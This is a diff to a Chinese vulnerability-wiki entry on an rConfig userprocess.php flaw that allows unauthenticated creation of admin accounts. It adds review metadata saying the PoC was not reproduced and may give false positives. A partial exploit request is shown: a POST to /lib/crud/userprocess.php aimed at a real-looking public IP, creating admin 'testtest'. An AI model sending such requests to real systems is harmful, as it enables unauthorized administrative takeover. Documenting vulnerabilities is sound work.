@@ -1,9 +1,55 @@
 ---
 version: "rConfig"
 source: "Threekiii/Vulnerability-Wiki"
+id: "vw-0ad988e5993943a4f542dfc2"
+entity_id: "ve-0ad988e5993943a4f542dfc2"
+schema_version: "1"
+title: "rConfig userprocess.php 任意用户创建漏洞"
+product: "rConfig"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "未登录POST add/editid空；ulevelid9；无软件版本"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/rConfig/rConfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E.md"
+review_date: "2026-10-02"
+side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
+source_status: "unknown"
 ---
 
 # rConfig userprocess.php 任意用户创建漏洞
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：rConfig
+- 本文讨论：userprocess.php无授权注册管理员，另有更新分支
+- 版本、权限与配置前提：未登录POST add/editid空；ulevelid9；无软件版本
+- 资料类型：账户创建源码研究；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 文件名误写userproce.php；未展示session.register内部检查，外层缺鉴权不足独立证明所有版本
+- 脚本allow_redirects false且仅检查响应body不含error，PHP通过Location?error跳转会误报
+- 示例残留真实公网目标；缺版本/补丁/CVE
+- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+
+### 操作风险与恢复
+
+- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本
+
+### 待核与来源
+
+- 注册函数权限、版本范围和后续登录确证待核验
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 ## 漏洞描述
 
@@ -279,7 +325,7 @@ $process = new Process;
 
 发送如下请求包创建管理员用户 testtest，密码为 testtest[@123 ]() 
 
-```plain
+```http
 POST /lib/crud/userprocess.php HTTP/1.1
 Host: 194.149.41.11
 User-Agent: python-requests/2.25.1
